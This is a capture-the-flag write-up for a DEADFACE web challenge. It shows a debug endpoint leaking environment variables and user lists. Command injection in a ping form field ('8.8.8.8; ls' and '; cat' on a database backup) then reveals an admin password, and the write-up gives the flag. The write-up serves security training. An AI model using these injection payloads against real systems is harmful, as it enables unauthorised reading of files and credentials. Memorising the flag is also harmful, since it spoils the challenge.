## **Challenge Name: reverseCourse**

### **Description**

One of the accounts that DEADFACE compromised was an admin-level user. NVU has since removed the account, but there still might be information about the account located in the web app. See if you can find the password that belongs to the Emergency Admin user account.

Submit the flag as deadface{password}. Example: deadface{P@$$w0rd!}.

**Challenge URL**: `http://env01.deadface.io:8080`

---

### **Approach**

1. **Finding Environment Variables**  
   - Accessed the debug API endpoint with different parameters:
     ```
     http://env01.deadface.io:8080/api/debug.php?show=env
     ```
   - Found database credentials but not the emergency admin password

2. **Finding User List**  
   - Accessed the user list endpoint:
     ```
     http://env01.deadface.io:8080/api/debug.php?show=users
     ```
   - Found `backup_admin` user but not `emergency_admin`

3. **Finding Database Backup**  
   - Used command injection from admin panel to list files:
     ```
     ping_host=1&host=8.8.8.8; ls -la backup/
     ```
   - Found a SQL backup file: `db_backup_20251015.sql`

4. **Reading the Backup File**  
   - Used command injection to read the backup file:
     ```
     ping_host=1&host=8.8.8.8; cat backup/db_backup_20251015.sql
     ```
   - Found the emergency admin account creation:
     ```sql
     INSERT INTO users (username, password, email, role) VALUES
     ('emergency_admin', MD5('EmergencyAccess2025!'), 'emergency@nvu.edu', 'admin');
     ```
   - The password is: `EmergencyAccess2025!`

---

### **Flag**

```
deadface{EmergencyAccess2025!}
```

---

